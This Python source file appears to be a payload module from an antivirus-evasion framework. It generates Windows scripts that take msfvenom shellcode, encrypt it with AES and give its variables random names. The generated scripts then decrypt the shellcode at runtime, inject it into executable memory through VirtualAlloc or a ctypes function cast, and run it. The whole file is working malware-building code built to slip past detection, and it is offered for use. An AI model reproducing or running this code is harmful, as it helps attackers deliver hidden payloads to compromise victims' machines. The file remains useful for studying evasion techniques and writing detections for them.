"""

This payload has AES encrypted shellcode stored within itself.  At runtime, the executable
uses the key within the file to decrypt the shellcode, injects it into memory, and executes it.


Based off of CodeKoala which can be seen here:
http://www.codekoala.com/blog/2009/aes-encryption-python-using-pycrypto/
Looks like Dave Kennedy also used this code in SET
https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/core/setcore.py.


module by @christruncer

"""


from Crypto.Cipher import AES

from modules.common import shellcode
from modules.common import randomizer
from modules.common import crypters
from modules.common import encryption


class Payload:
	
	def __init__(self):
		# required options
		self.description = "AES Encrypted shellcode is decrypted at runtime with key in file, injected into memory, and executed"
		self.language = "python"
		self.rating = "Excellent"
		self.extension = "py"
		
		self.shellcode = shellcode.Shellcode()
		# options we require user interaction for- format is {Option : [Value, Description]]}
		self.required_options = {"compile_to_exe" : ["Y", "Compile to an executable"],
						"use_pyherion" : ["N", "Use the pyherion encrypter"],
						"inject_method" : ["virtual", "[virtual]alloc or [void]pointer"]}
		
		
	def generate(self):
		if self.required_options["inject_method"][0].lower() == "virtual":
			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
		
			# Generate Random Variable Names
			ShellcodeVariableName = randomizer.randomString()
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			RandDecodeAES = randomizer.randomString()
			RandCipherObject = randomizer.randomString()
			RandDecodedShellcode = randomizer.randomString()
			RandShellCode = randomizer.randomString()
			RandPadding = randomizer.randomString()
		
    
			# Generate Random AES Key
			secret = randomizer.randomKey()

			# Create Cipher Object with Generated Secret Key
			cipher = AES.new(secret)
		
			EncodedShellcode = encryption.EncodeAES(cipher, Shellcode)
		
			# Create Payload code
			PayloadCode = 'import ctypes\n'
			PayloadCode += 'from Crypto.Cipher import AES\n'
			PayloadCode += 'import base64\n'
			PayloadCode += 'import os\n'
			PayloadCode += RandPadding + ' = \'{\'\n'
			PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
			PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
			PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
			PayloadCode += RandShellCode + ' = bytearray(' + RandDecodedShellcode + '.decode("string_escape"))\n'
			PayloadCode += RandPtr + ' = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(' + RandShellCode + ')),ctypes.c_int(0x3000),ctypes.c_int(0x40))\n'
			PayloadCode += RandBuf + ' = (ctypes.c_char * len(' + RandShellCode + ')).from_buffer(' + RandShellCode + ')\n'
			PayloadCode += 'ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(' + RandPtr + '),' + RandBuf + ',ctypes.c_int(len(' + RandShellCode + ')))\n'
			PayloadCode += RandHt + ' = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(' + RandPtr + '),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))\n'
			PayloadCode += 'ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(' + RandHt + '),ctypes.c_int(-1))\n'
		
			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)

			return PayloadCode

		else:
			# Generate Shellcode Using msfvenom
			Shellcode = self.shellcode.generate()
		
			# Generate Random Variable Names
			ShellcodeVariableName = randomizer.randomString()
			RandPtr = randomizer.randomString()
			RandBuf = randomizer.randomString()
			RandHt = randomizer.randomString()
			RandDecodeAES = randomizer.randomString()
			RandCipherObject = randomizer.randomString()
			RandDecodedShellcode = randomizer.randomString()
			RandShellCode = randomizer.randomString()
			RandPadding = randomizer.randomString()
			RandShellcode = randomizer.randomString()
			RandReverseShell = randomizer.randomString()
			RandMemoryShell = randomizer.randomString()
    
			# Generate Random AES Key
			secret = randomizer.randomKey()

			# Create Cipher Object with Generated Secret Key
			cipher = AES.new(secret)
		
			EncodedShellcode = encryption.EncodeAES(cipher, Shellcode)
		
			# Create Payload code
			PayloadCode = 'from ctypes import *\n'
			PayloadCode += 'from Crypto.Cipher import AES\n'
			PayloadCode += 'import base64\n'
			PayloadCode += 'import os\n'
			PayloadCode += RandPadding + ' = \'{\'\n'
			PayloadCode += RandDecodeAES + ' = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(' + RandPadding + ')\n'
			PayloadCode += RandCipherObject + ' = AES.new(\'' + secret + '\')\n'
			PayloadCode += RandDecodedShellcode + ' = ' + RandDecodeAES + '(' + RandCipherObject + ', \'' + EncodedShellcode + '\')\n'
			PayloadCode += ShellcodeVariableName + ' = ' + RandDecodedShellcode + '.decode("string_escape")\n'
			PayloadCode += RandMemoryShell + ' = create_string_buffer(' + ShellcodeVariableName + ', len(' + ShellcodeVariableName + '))\n'
			PayloadCode += RandShellcode + ' = cast(' + RandMemoryShell + ', CFUNCTYPE(c_void_p))\n'
			PayloadCode += RandShellcode + '()'
    
			if self.required_options["use_pyherion"][0].lower() == "y":
				PayloadCode = crypters.pyherion(PayloadCode)

			return PayloadCode
